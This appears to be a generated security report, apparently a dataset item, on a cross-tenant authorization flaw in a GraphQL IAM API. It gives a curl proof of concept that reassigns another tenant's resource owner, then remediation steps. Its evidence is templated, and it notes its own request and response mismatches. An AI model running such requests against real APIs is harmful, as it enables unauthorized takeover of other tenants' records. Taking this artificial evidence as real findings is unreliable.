# Security Analysis Report
**System:** VaultGuard IAM API
**Domain:** Cloud IAM / Identity Provider
**Example ID:** GQL-0294
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.9 | Batch/bulk lookup without per-ID ownership check on `updateResource` — attacker from `tenant-e7ff` modifies IAM records owned by `tenant-8829` |

---

## Finding 1 — BOLA: Batch/Bulk Lookup Without Per-ID Ownership Check (Pattern 1.9)

### Summary
The `updateResource` mutation on VaultGuard IAM API (`api.vaultguard-iam-api.example.com`) accepts a client-supplied `ownerId` in the mutation input without verifying that the authenticated user's JWT `tenantId` matches the target resource's `tenantId`. Per §5.0 Pattern 1.9, the `bulkResourceLookup` mutation (and related batch operations) accept IDs without per-ID ownership filtering, enabling cross-tenant enumeration. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses the `updateResource` mutation (a write operation setting `ownerId`), while §5.0 describes Pattern 1.9 as batch/bulk lookup. Additionally, the response JSON key is `getResource` (INCONSISTENT with `updateResource`). The HAR (§6.0) is the primary evidence for the exploit path; §5.0 identifies the design-level risk pattern.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-e7ff8829"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.9 — Batch/bulk lookup endpoints (BOLA)
**Affected resolver:** `updateResource` (HAR-evidenced); `bulkResourceLookup` (Pattern 1.9 design risk)
**Affected endpoint:** `POST https://api.vaultguard-iam-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-e7ff`, modifying resource of `tenant-8829`)**
```
POST https://api.vaultguard-iam-api.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-e7ff

{"query": "query VulnerableOp { updateResource(id: \"R-2294\", input: {status: \"approved\", ownerId: \"attacker-e7ff8829\"}) { resourceId status } }"}
```

**Response — Cross-Tenant IAM Resource Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-8829",
      "ownerId": "other-user-e7ff8829",
      "data": {
        "sensitiveField": "CONFIDENTIAL-e7ff8829",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-e7ff8829` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.vaultguard-iam-api.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-e7ff" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2294\", input: {status: \"approved\", ownerId: \"attacker-e7ff8829\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-8829 returned for tenant-e7ff caller; ownerId reassigned
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Validate `resource.tenantId === jwt.tenantId` before any write in `updateResource`.
2. Remove `ownerId` and `tenantId` from writable input fields (prevent mass assignment of ownership).
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
